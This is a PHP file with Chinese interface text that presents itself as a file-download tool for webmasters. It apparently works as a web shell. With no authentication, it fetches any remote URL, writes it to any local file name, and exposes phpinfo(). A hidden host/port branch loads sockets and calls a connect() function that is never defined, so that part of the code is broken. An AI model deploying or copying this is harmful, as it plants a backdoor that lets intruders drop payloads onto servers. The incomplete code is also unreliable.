<html>
<body>
<head>
<title>PHP web下载工具 by:叶逍遥</title>
<style>
body{
      margin-top=100px;
      background:#000000;
      color:green;
}
</style>
</head>
<?
error_reporting(0);
set_time_limit(0);
$main=$_SERVER['PHP_SELF'] ? $_SERVER['PHP_SELF'] : $_SERVER['SCRIPT_NAME'];
$system=strtoupper(substr(PHP_OS, 0, 3));
if(PHP_VERSION < '4.1.0') {
      $_POST = &$HTTP_POST_VARS;
      $_GET = &$HTTP_GET_VARS;
}
if(isset($_GET['phpinfo'])&&!isset($_POST['host1'])&&!isset($_POST['host2'])&&!isset($_POST['host3'])) phpinfo();
if(!isset($_POST['host1'])&&!isset($_POST['host2'])&&!isset($_POST['host3'])){
print<<<eof
<html>
<body>
<head>
<title>PHP web下载工具 by:叶逍遥</title>
<style>
body{
      margin:0;
      padding:0;
      background:#000000;
      color:green;
      margin-left:150px;
      margin-right:150px;
      margin-top=10px;
      FONT-FAMILY: verdana;
      FONT-SIZE: 10px;
}
input{
      margin:0px;
      padding:0px;
      color:green;
      border: 1px;
      border-bottom-color:#ffffff;
}
</style>
</head>
<body><center><h4>PHP Web Detector Bata 1.01</h4>
 
<table border=1 bordercolorlight="303632" bordercolordark="000000">
<tr><td><center><b>文件下载工具</b><center></td></tr>
<tr><td>为拉方便站长管理以及自己网站管理及下载程序安全特别为站长所写 php下载程序1.1 支持官方.</td><tr>
<tr><td><form method=post action="">
Remote_file: <input type=text name='host3' value='http://hi.baidu.com/多情剑.rar' size=50><p>
Local_name: <input type=text name='file3' value='多情剑.rar' size=50>
<input type=submit value='开始下载'></td></tr></table></p></p><p></p></form>
 
<center>Code By Inking    <a href='http://hi.baidu.com/多情剑'>The Entry To My Website</a>    QQ:1326077093<p>Thanks To The Men Who Share The Codes On The Web</center>
</body>
</html>
eof;
}
elseif(isset($_POST['host1']) && isset($_POST['port1'])){
      if(!extension_loaded('sockets')){
            if ($system == 'WIN') {
                  @dl('php_sockets.dll') or die("Can't load socket");
            }
            else{
                  @dl('sockets.so') or die("Can't load socket");
            }
      }
      $host1 = $_POST['host1'];
      $port1 = $_POST['port1'];
      connect();
      echo $host1;
}
elseif(isset($_POST['host3']) && isset($_POST['file3'])){
      $host3=$_POST['host3'];
      $file3=$_POST['file3'];
      download();
}


function download(){
      global $host3,$file3,$main;
      if(file_exists($file3))
            echo "<center>文件已存在,请重新定义文件名,<a href=$main>点击这里返回</a><center>";
      else{
            $content=file_get_contents($host3);
            $f=fopen($file3,'w');
            $write=fwrite($f,$content);
            fclose($f);
            if(file_exists($file3))
                  echo "<center>文件下载成功, <a href=$file3>点击查看 </a>或者 <a href=$main>返回</a><center>";
      }
}
?>
</body>
</html>
